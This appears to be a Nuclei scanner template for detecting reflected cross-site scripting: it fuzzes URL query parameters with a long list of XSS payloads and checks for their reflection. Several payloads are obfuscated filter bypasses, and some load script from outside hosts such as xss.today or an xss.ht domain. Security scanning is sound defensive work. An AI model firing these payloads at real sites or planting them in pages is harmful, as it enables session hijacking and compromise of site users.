id: reflected-xss

info:
  name: Reflected Cross Site Scripting
  author: pdteam
  severity: medium
  tags: xss,rxss,dast

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      reflection:
        - '"><ð˜€ð˜ƒð—´+ð—¼ð—»ð—¹ð—¼ð—®ð—±=ð—°ð—¼ð—»ð—³ð—¶ð—¿ð—º(ð—°ð—¼ð—¼ð—¸ð—¶ð—²)>'
        - "<Img Src=OnXSS OnError=confirm('Hacked_by_mijan')>"
        - 'ab@gmail.com\"><svg/onload=alert(/xss/)>'
        - 'KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui'
        - "%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e"
        - "><script%20>alert(document.domain)<%2fscript>"
        - '"><img/src/onerror=import("//domain/")>"@yourdomain'
        - "013371337;ext=<img/src/onerror=import('//domain/')>"
        - "<Svg Only=1 OnLoad=confirm(document.domain)>"
        - '<Svg/OnLoad=alert(1337)>"@gmail.com'
        - '<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>'
        - "<svg onload=alert&#0000000040document.cookie)>"
        - '<svg onload=alert&#0000000040"1")><â€â€>'
        - '<Img Src=//X55.is OnLoad%0C=import(Src)>'
        - "%3Csvg%20onload=alert(%22MrHex88%22)%3E"
        - "%3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E"
        - '"><svg onmouseover="confirm&#0000000040document.domain)'
        - "%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o"
        - 'javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")'
        - "<Script>window.valueOf=alert;window%2B1</Script>"
        - "<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)"
        - '><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--'
        - "1%22onfocus=%27alert%28document.cookie%29%27%20autofocus="
        - "1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus="
        - '"><img src=x onerror=alert("xss!")>.pdf'
        - "%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E"
        - "<sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>"
        - "%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2Fxss.today%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E"
        - "<sCrIpT>(function(){var a=[97,108,101,114,116];var"
        - "b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=String.fromCharCode.apply(null,c);window[b](d);})()</sCrIpT>"
        - "<svg onload=(function(){let arr=[41,49,40,116,114,101,108,97].reverse().map(e=>String.fromCharCode(e));let func=new Function(...arr);func();})()>"
        - '<svg onload="alert(1)"></svg>'
        - "<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>"
        - '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>'
        - '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>'
        - "<math><x xlink:href=javascript:confirm`1`>click"
        - "<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/"
        - "<svg onload=alert&#0000000040document.cookie)>"
        - "JavaScript://%250Aalert?.(1)//"
        - "</Title/</Style/</Script/</textArea/</iFrame/</noScript>"
        - "\\74k<K/contentEditable/autoFocus/OnFocus="
        - "/*${/*/;{/**/(alert)(1)}//><Base/Href=//google.com\\76-->"
        - "<detalhes%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%230000000000000000041//"
        - "javascript:%ef%bb%bfalert(XSS)"
        - '"><video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>'
        - '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x" /></svg>'
        - '<img/src=x onError="`${x}`;alert(`Hello`);">'
        - '"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>'
        - "&#34;&gt;&lt;track/onerror=&#x27;confirm\\%601\\%60&#x27;&gt;"
        - "<svg/onload=location=â€˜javasâ€™%2Bâ€˜cript:â€™%2B"
        - "â€˜aleâ€™%2Bâ€˜rtâ€™%2Blocation.hash.substr(1)>#(1)"
        - "<svg/onload=location=/javas/.source%2B/cript:/.source%2B"
        - "/ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)"
        - "<SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>"
        - "';k='e'%0Atop['al'+k+'rt'](1)//"
        - "<Img Src=//X55.is OnLoad%0C=import(Src)>"
        - "<img/src/onerror=alert/1337/(1)>"
        - "<img/src/onerror=alert//&NewLine;(2)>"
        - "<img/src/onerror=alert&sol;&sol;(3)>"
        - '"/><script%20>alert(document.domain)<%2fscript>.css'
        - '<iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>'
        - "/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)"
        - "login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain"
        - "<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(VulneravelXSS%26%2300000000000000000041//"
    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{reflection}}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"
# digest: 4a0a0047304502205a9aa38841e7308e5d1bf21526d6ae14c3ea4b5b00def0f0f0b95501c0df237d022100ca9a3145f00b6278b60ccc0cb44b525a7bfcf2f86ead8664c33c0ce345a623ea:922c64590222798bb761d5b6d8e72950